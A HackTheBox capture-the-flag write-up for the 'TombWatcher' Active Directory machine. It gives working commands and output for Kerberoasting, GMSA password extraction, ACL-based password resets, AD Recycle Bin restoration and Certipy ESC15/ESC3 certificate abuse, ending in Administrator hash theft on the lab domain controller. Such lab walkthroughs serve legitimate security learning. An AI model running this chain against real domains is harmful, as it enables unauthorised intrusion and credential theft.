---
title: "HTB - TombWatcher (Hard | Windows | Active Directory)"
date: 2026-09-13 00:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, ad-recycle-bin, addself, bloodhound, bloodyad, certipy, esc15, esc3, forcechangepassword, genericall, kerberoasting, readgmsapassword, targeted-kerberoasting, upn, writeowner, writespn]
description: "Active Directory ACL abuse & AD Recycle Bin to ADCS ESC15 for Domain Admin"
image:
  path: /assets/img/tombwatcher.png
---

## **Recon**


```bash
nmap -p- --min-rate 10000 <target>
```

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49683/tcp open  unknown
49684/tcp open  unknown
49685/tcp open  unknown
49701/tcp open  unknown
49707/tcp open  unknown
49726/tcp open  unknown
```

The target is a Windows Domain Controller running Active Directory with multiple services including DNS, Kerberos, LDAP, and WinRM. The domain is identified as tombwatcher.htb.

### Initial Credentials

The engagement begins with valid credentials for the henry user:

```bash
nxc smb <target> -u henry -p 'H3nry_987TGV!'
```

```
SMB         <target>   445    DC01             
[+]  tombwatcher.htb\henry:H3nry_987TGV!
```

The credentials are validated successfully on SMB and will be used for initial enumeration.

### BloodHound Collection

Collect Active Directory information using BloodHound Python to map the attack path:

```bash
sudo bloodhound-python -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -c All -ns <target> --zip
```

This provides a comprehensive view of the domain structure, user relationships, and potential privilege escalation paths.

### RID Brute Force Enumeration

Enumerate all users and groups in the domain:

```bash
nxc smb <target> -u henry -p 'H3nry_987TGV!' --rid-brute
```

![](/assets/img/tombwatcher/Pasted_image_20260913044126.png)

The enumeration reveals several domain users including Alfred, Sam, and John, along with various security groups and service accounts.

---

## **User**

### Targeted Kerberoasting

With the WriteSPN privilege over the Alfred user (identified via BloodHound), a targeted Kerberoasting attack can be performed. This involves temporarily adding a Service Principal Name (SPN) to Alfred's account, requesting a Kerberos ticket, and then cracking it offline.

![](/assets/img/tombwatcher/Pasted_image_20260913084124.png)

#### Step 1: Add SPN to Alfred

Synchronize time with the DC and add an SPN to the Alfred account using BloodyAD:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host <target> -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v 'HTTP/FakeService'
```

![](/assets/img/tombwatcher/Pasted_image_20260913045231.png)

The SPN is successfully added, making Alfred Kerberoastable.

#### Step 2: Request TGS Ticket

Use Impacket's GetUserSPNs to request a TGS ticket for Alfred:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-GetUserSPNs 'tombwatcher.htb/henry:H3nry_987TGV!' -dc-ip <target> -request-user Alfred -outputfile hashes.kerberoast
```

![](/assets/img/tombwatcher/Pasted_image_20260913045302.png)

The Kerberos ticket is extracted and saved to a file for offline cracking.

#### Step 3: Crack the Hash

Use John the Ripper to crack the Kerberos hash against the rockyou.txt wordlist:

```bash
john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/tombwatcher/Pasted_image_20260913045330.png)

**Result:** Alfred's password is cracked to **basketball**

#### Step 4: Validate Credentials

```bash
nxc smb <target> -u alfred -p 'basketball' -d tombwatcher.htb
[+] tombwatcher.htb\alfred:basketball
```

Alfred's credentials are validated successfully. Analysis of BloodHound data shows the next escalation path:

### AddSelf & GMSA Exploitation

Alfred has Addself privilege over the Infrastructure group.

![](/assets/img/tombwatcher/Pasted_image_20260914171946.png)

Infrastructure Group has ReadGMSAPassword over ansible_dev$ user.

![](/assets/img/tombwatcher/Pasted_image_20260914172015.png)
#### Step 1: Join Infrastructure Group

Alfred has AddSelf privilege over the Infrastructure group. Add Alfred to gain ReadGMSAPassword access:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
bloodyAD --host <target> -d tombwatcher.htb -u alfred -p 'basketball' add groupMember 'INFRASTRUCTURE' alfred

[+] alfred added to INFRASTRUCTURE
```

![](/assets/img/tombwatcher/Pasted_image_20260913050206.png)

Alfred is successfully added to the Infrastructure group.

#### Step 2: Extract GMSA Password

Use netexec to read the GMSA password for the ansible_dev$ account:

```bash
nxc ldap <target> -u alfred -p 'basketball' -d tombwatcher.htb --gmsa
```

![](/assets/img/tombwatcher/Pasted_image_20260913050506.png)

**Extracted GMSA NTLM Hash:** `3eca34dd13a85db79c03178b7b149621`

#### Step 3: Validate GMSA Credentials

```bash
nxc smb <target> -u 'ansible_dev$' -H '3eca34dd13a85db79c03178b7b149621' -d tombwatcher.htb

[+] tombwatcher.htb\ansible_dev$:3eca34dd13a85db79c03178b7b149621
```

The GMSA account credentials are validated.

### ForceChangePassword Privilege

ansible_dev$ has ForceChangePassword over sam user.

![](/assets/img/tombwatcher/Pasted_image_20260913084429.png)

#### Step 1: Change Sam's Password

The ansible_dev$ GMSA account has ForceChangePassword privilege over the Sam user. Exploit this to set a new password:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -H "<target>" -d "tombwatcher.htb" -u "ansible_dev$" -p "aad3b435b51404eeaad3b435b51404ee:3eca34dd13a85db79c03178b7b149621" set password "sam" "NewPassword123@@@"
```

![](/assets/img/tombwatcher/Pasted_image_20260913051210.png)

Sam's password is successfully changed.

#### Step 2: Verify Sam Access

```bash
nxc smb <target> -u sam -p 'NewPassword123@@@' -d tombwatcher.htb

[+] tombwatcher.htb\sam:NewPassword123@@@
```

Sam's account is now accessible.

### WriteOwner and Shadow Credentials

Sam has WriteOwner over John user.

![](/assets/img/tombwatcher/Pasted_image_20260913084515.png)

#### Step 1: Set Owner

Sam has WriteOwner privilege over the John user. Set Sam as the owner of John's account:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -H "<target>" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" set Owner "john" "sam"
```

![](/assets/img/tombwatcher/Pasted_image_20260913053012.png)

Sam is set as the owner of John's account.

#### Step 2: Grant GenericAll

As the owner, Sam can now grant themselves GenericAll privileges over John:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -H "<target>" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" add genericAll "john" "sam"
```

![](/assets/img/tombwatcher/Pasted_image_20260913053317.png)

GenericAll privilege is successfully granted.

#### Step 3: Change John's Password

With GenericAll privileges, Sam can now change John's password:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \ 
bloodyAD -H "<target>" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" set password "john" "johnPassword@@@123"
```

![](/assets/img/tombwatcher/Pasted_image_20260913053306.png)

John's password is successfully changed.

#### Step 4: Verify WinRM Access

Test if John has WinRM permissions:

```bash
nxc winrm <target> -u john -p 'johnPassword@@@123'

[+] tombwatcher.htb\john:johnPassword@@@123 (Pwn3d!)
```

John has WinRM access enabled.

#### Step 5: Establish Shell

Connect to the target via WinRM:

```bash
evil-winrm -i <target> -u john -p 'johnPassword@@@123'
```

An interactive PowerShell session is established as John on the Domain Controller and capture the user flag.

---

## **Root**

### AD Recycle Bin Recovery

John has GenericAll over ADCS OU.

![](/assets/img/tombwatcher/Pasted_image_20260913085000.png)

#### Step 1: Enumerate Deleted Objects

From the John session, enumerate deleted objects in the Active Directory Recycle Bin:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

![](/assets/img/tombwatcher/Pasted_image_20260913060510.png)

A deleted user named cert_admin is discovered with ObjectGUID `938182c3-bf0b-410a-9aaa-45c8e1a02ebf`.

#### Step 2: Restore cert_admin Account

Restore the deleted cert_admin user account:

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
Enable-ADAccount -Identity cert_admin
```

The cert_admin account is successfully restored and enabled.

#### Step 3: Set New Password

Set a new password for the restored cert_admin account:

```powershell
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "P@sswordlinux!" -AsPlainText -Force)
```

The cert_admin account is now ready for use.

### ESC15 ADCS Exploitation

#### Step 1: Enumerate Vulnerable Templates

Use certipy to find vulnerable certificate templates accessible to cert_admin:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy-ad find -u cert_admin@tombwatcher.htb -p 'P@sswordlinux!' -dc <target> -vulnerable -stdout
```

```
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length               : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

The WebServer template is vulnerable to ESC15, allowing injection of arbitrary application policies.

#### Step 2: Request Certificate with Injected Policy

Request a certificate for the Administrator account with an injected Certificate Request Agent application policy:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'P@sswordlinux!' -dc-ip <target> -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1' -upn administrator@tombwatcher.htb -target-ip <target>
```

![](/assets/img/tombwatcher/Pasted_image_20260913070523.png)

A certificate is issued with the injected Certificate Request Agent policy.

#### Step 3: Perform ESC3 Attack

Using the Certificate Request Agent certificate, request a User certificate on behalf of Administrator:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy req -u cert_admin -p 'P@sswordlinux!' -dc-ip <target> -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

A valid Administrator certificate is generated.

#### Step 4: Extract Administrator Credentials

Authenticate using the Administrator certificate to obtain the NT hash:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy auth -pfx administrator.pfx -dc-ip <target>
```

![](/assets/img/tombwatcher/Pasted_image_20260913070914.png)

**Administrator NT Hash:** `f61db423bebe3328d33af26741afe5fc`

#### Step 5: Establish Root Shell

Connect as Administrator using the extracted hash:

```bash
evil-winrm -i <target> -u administrator -H 'f61db423bebe3328d33af26741afe5fc'
```

Full administrative access to the Domain Controller is achieved.

---

### Attack Chain Summary

1. **Initial Access:** Validated henry credentials provided in the engagement scenario
2. **Reconnaissance:** BloodHound enumeration identified escalation paths through the domain
3. **Targeted Kerberoasting:** Exploited WriteSPN privilege to add SPN to Alfred, Kerberoasted the account, and cracked the password to obtain alfred:basketball
4. **GMSA Exploitation:** Used Alfred's AddSelf privilege to join the Infrastructure group and extracted the GMSA password for ansible_dev$
5. **ForceChangePassword:** Leveraged ansible_dev$'s privileges to change Sam's password
6. **WriteOwner Chain:** Sam used WriteOwner privilege over John to gain control and establish shell access
7. **AD Recycle Bin Recovery:** Restored the deleted cert_admin account from the AD Recycle Bin
8. **ESC15 ADCS Exploitation:** Abused the vulnerable WebServer template with schema version 1 to inject application policies, combined with ESC3 to obtain an Administrator certificate
9. **Root Access:** Used the Administrator certificate to extract the NT hash and achieve full domain compromise